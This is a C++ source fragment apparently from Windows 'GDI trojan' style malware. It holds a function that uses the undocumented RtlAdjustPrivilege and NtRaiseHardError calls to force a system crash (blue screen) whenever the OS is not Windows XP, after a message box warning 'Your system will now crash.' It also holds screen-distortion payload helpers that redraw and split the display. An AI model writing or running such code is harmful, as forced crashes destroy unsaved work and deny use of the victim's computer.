EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, PBYTE);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, DWORD, DWORD, PDWORD_PTR, DWORD, PDWORD);

WINBOOL CheckForWindowsXP() {
	OSVERSIONINFOA osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	GetVersionExA(&osvi);
	if (osvi.dwMajorVersion == 5) {
		return true;
	}
	return false;
}

void SimulateSystemCrash(NTSTATUS ntStatus, DWORD dwResponse) {
	BYTE ntBool;
	RtlAdjustPrivilege(19, true, false, &ntBool);
	NtRaiseHardError(ntStatus, 0, 0, 0, 6, &dwResponse);
}

void NotWindowsXP() {
	MessageBoxW(NULL, L"Incorrect OS!\r\nYour system will now crash.", NULL, MB_ICONERROR);
	DWORD ntResponse;
	SimulateSystemCrash(0xc0000015, ntResponse);
}

void EndPayload(HANDLE hPayload) {
	TerminateThread(hPayload, 0);
	CloseHandle(hPayload);
}

int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

COLORREF crSpectrum(int crLength) { // I rewrote this from raduminecraft
    double H = fmod(crLength, 360);
    double S = 1.0;
    double V = 0.5;
    double C = (1.0-fabs(2.0*V-1.0)) * S;
    double X = C*(1.0-fabs(fmod(H/60.0, 2.0) - 1.0));
    double M = V - C / 2.0;
    double R, G, B;
    if (H < 60) {
        R = C; G = X, B = 0;
    }
    else if (H < 120) {
        R = X; G = C; B = 0;
    }
    else if (H < 180) {
        R = 0; G = C; B = X;
    }
    else if (H < 240) {
        R = 0; G = X; B = C;
    }
    else if (H < 300) {
        R = X; G = 0; B = C;
    }
    else {
        R = C; G = 0; B = X;
    }
    
    int crRed = static_cast<INT>((R + M) * 255);
    int crGreen = static_cast<INT>((G + M) * 255);
    int crBlue = static_cast<INT>((B + M) * 255);
    return RGB(crRed, crGreen, crBlue);
}

float fclr = 0.0;

typedef union _TRGBQUAD {
	COLORREF rgb;
	struct {
		BYTE red;
		BYTE green;
		BYTE blue;
		BYTE unused;
	};
} TRGBQUAD, *PTRGBQUAD;

VOID WINAPI SplitBlt(HDC hdc, int strength, int xSrc, int ySrc, DWORD dwSrcMode) {
	BitBlt(hdc, -strength, -strength, xSrc/2, ySrc/2, hdc, 0, 0, dwSrcMode);
	BitBlt(hdc, xSrc/2+strength, -strength, xSrc/2, ySrc/2, hdc, xSrc/2, 0, dwSrcMode);
	BitBlt(hdc, -strength, ySrc/2+strength, xSrc/2, ySrc/2, hdc, 0, ySrc/2, dwSrcMode);
	BitBlt(hdc, xSrc/2+strength, ySrc/2+strength, xSrc/2, ySrc/2, hdc, xSrc/2, ySrc/2, dwSrcMode);
}

DWORD CALLBACK ContextRedraw(LPVOID lprdw) {
	while (true) {
		Sleep(570);
		InvalidateRect(NULL, 0, 0);
	}
}
